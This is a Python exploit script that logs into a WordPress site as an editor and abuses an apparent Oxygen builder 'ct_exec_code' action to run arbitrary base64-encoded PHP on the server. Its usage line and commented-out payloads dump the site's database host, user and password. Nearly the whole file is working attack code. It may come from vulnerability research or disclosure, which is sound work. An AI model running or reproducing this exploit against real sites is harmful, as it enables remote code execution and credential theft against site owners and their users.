#!/usr/bin/env python3

import sys, requests, base64, os
from helpers import *

if len(sys.argv) < 5:
    print("Too few args")
    print("Usage: ./editor_rce.py https://example.com editor editor_pw '<?php echo DB_PASSWORD; ?>'")
    exit()

host = sys.argv[1]
username = sys.argv[2]
password = sys.argv[3]
php_code_b64 = base64.b64encode(sys.argv[4].encode('utf-8')).decode('utf-8')
#print("b64:",php_code_b64)

if not os.path.exists('_cookies'):
    extract_cookies(host, username, password)

nonce = get_nonce(host + "?ct_builder=true")
post_id = get_post_id(host + "?ct_builder=true")

params = {
    'action': 'ct_exec_code',
    'nonce': nonce,
    'post_id': post_id,
}

json_data = {
    'code': php_code_b64,
#    'code': 'PD9waHAKICBlY2hvICJoYWNrIG1lIjsKPz4=',
#    'code': 'PD9waHAgZWNobyAiSG9zdDogIiAuIERCX0hPU1QgLiAiLCBVc2VyOiAiIC4gREJfVVNFUiAuICIsIHBhc3M6ICIgLiBEQl9QQVNTV09SRDsgPz4=',
    'query': {
        'page': '',
        'pagename': 'editor-page-hack-me',
    },
}

headers = {
    'Accept': 'application/json, text/plain, */*',
    'Accept-Language': 'sv-SE,sv;q=0.9,en-US;q=0.8,en;q=0.7',
    'Cache-Control': 'no-cache',
    'Connection': 'keep-alive',
    'Content-Type': 'application/json;charset=UTF-8',
    'Origin': 'http://localhost/',
    'Pragma': 'no-cache',
    'Referer': 'http://localhost/?ct_builder=true&oxygen_iframe=true',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
    'sec-ch-ua': '"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"macOS"',
}

response = requests.post(
    host,
    params=params,
    cookies=load_cookies(),
    headers=headers,
    json=json_data,
)

if response.status_code == 200:
    print("PHP Executed")
    print(response.text)
else:
    print(response.text)
    print("#################")
    print("## ERROR ########")
    print("#################")


